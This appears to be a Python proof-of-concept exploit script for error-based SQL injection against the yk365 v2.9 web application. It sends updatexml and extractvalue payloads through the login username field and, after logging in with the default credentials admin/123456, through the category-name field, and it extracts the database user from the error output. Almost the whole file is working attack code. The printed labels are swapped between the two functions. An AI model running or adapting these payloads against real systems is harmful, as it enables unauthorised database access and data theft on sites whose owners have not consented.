# *_* coding=utf-8 *_*
# Author:Whysec
import requests
import random
import re

login = '/system/login.php'
admin_index = '/system/admin.php'
# page_sqlinject_url = "/system/page.php"

def category_sqlinject(url):
    user_sqlinject_url = '/system/category.php'

    data = {
        'username': 'admin',
        'pass': '123456',
        'act': 'login'
    }
    user_sqlinject_data = {
        'root_id': 0,
        'cate_name': "%s' and (extractvalue(1,concat(0x7e,user(),0x7e),1))#" % (random.uniform(100, 200)),
        'act': 'saveadd'
    }
    session = requests.session()
    session.post(url+login,data=data)
    res = session.post(url+user_sqlinject_url,data=user_sqlinject_data)
    if "TIPS" in res.text:
        print("[*]info user_sqlinject:Yes")
        print("[+]info user_sqlinject:"+ re.findall(r'~(.*)~',res.text)[0])

def login_sqlinject(url):
    data = {
        'username': "%s' and (updatexml(1,concat(0x7e,user(),0x7e),1))#" % (random.uniform(100, 200)),
        'pass': '123456',
        'act': 'login'
    }
    session = requests.session()
    res = session.post(url + login, data=data)
    user = re.findall(r'~(.*)~', res.text)[0]
    if "TIPS" in res.text:
        print("[*]info category_sqlinject:Yes")
    else:
        print("[*]info category_sqlinject:No")

if __name__ == '__main__':
    login_sqlinject("http://127.0.0.1/sql/yk365_v2.9/")
    category_sqlinject("http://127.0.0.1/sql/yk365_v2.9/")
